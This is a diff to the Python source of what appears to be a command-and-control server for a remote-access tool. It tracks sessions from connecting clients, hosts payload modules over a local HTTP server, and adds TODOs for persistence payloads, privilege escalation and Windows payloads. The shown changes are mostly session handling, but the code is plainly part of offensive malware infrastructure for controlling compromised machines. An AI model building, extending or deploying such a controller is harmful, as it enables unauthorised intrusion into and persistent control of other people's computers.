@@ -10,7 +10,6 @@ import random
 
 
 class server():
-    #TODO: implement what a "instruction" payload to send to the client is, (maybe json?, dictionarty?)
     def __init__(self, host='localhost', port = 5000, db='memory'):
         self.socket = self._socket(port)
         self.sessions = []
@@ -20,6 +19,14 @@ class server():
         self.db = db
         self.app = None
         self.threads = []
+        #TODO: dockerfile
+        #TODO: list all sessions
+        #TODO: get session info (Operating system etc)
+        #TODO: compile payloads automatically for different operating systems
+        #TODO: write windows payloads
+        #TODO: DATABASE
+        #TODO: persistence payload
+        #TODO: Priv escalation
         self.commands = {
 
             'hello' : {
@@ -85,21 +92,27 @@ class server():
             try:
                 connection, ip = self.socket.accept()
                 helpers.show("\nRECEIVED CONNECTION REQUEST FROM: {}".format(ip), colour="GREEN", end="\n->")
-                
-                # Ensure the session ID is unique
-                while True:
-                    session_id = random.randint(1000, 9999)
-                    if not any(s.id == session_id for s in self.sessions):
-                            break
-                
-                new_session = session.Session(connection, session_id)
-                if new_session.check_connection():
-                    helpers.show("CONNECTION SUCCESSFUL", colour="GREEN", style="BRIGHT", end="\n->")
-                    
-                    self.sessions.append(new_session)
-                    helpers.show("CREATED NEW SESSION WITH ID " + str(session_id), colour="BLUE", style="BRIGHT", end="\n->")
+                client_ip = ip[0]
+
+                #check for existing session
+                existing_session = next((s for s in self.sessions if s.client_address == client_ip), None)
+                if existing_session:
+                    helpers.show(f"CLIENT {client_ip} CONNECTED AGAIN. SESSION ID {existing_session.id}", colour="YELLOW", end="\n->")
                 else:
-                    helpers.show("CONNECTION FAILED", colour="RED", style="BRIGHT", end="\n->")
+                    # Ensure the session ID is unique
+                    while True:
+                        session_id = random.randint(1000, 9999)
+                        if not any(s.id == session_id for s in self.sessions):
+                                break
+                    
+                    new_session = session.Session(connection, session_id)
+                    if new_session.check_connection():
+                        helpers.show("CONNECTION SUCCESSFUL", colour="GREEN", style="BRIGHT", end="\n->")
+                        
+                        self.sessions.append(new_session)
+                        helpers.show("CREATED NEW SESSION WITH ID " + str(session_id), colour="BLUE", style="BRIGHT", end="\n->")
+                    else:
+                        helpers.show("CONNECTION FAILED", colour="RED", style="BRIGHT", end="\n->")
             except socket.timeout:
                 pass       
                 
@@ -203,8 +216,9 @@ class server():
           
 if __name__ == "__main__":       
 
+
+
     #host the module files
-    #TODO: make compatible for linux file path too
     helpers.show("STARTING MODULE SERVER", colour='BLUE', style='BRIGHT', end='')
     globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/modules',shell=True)
     globals()['close'] = False
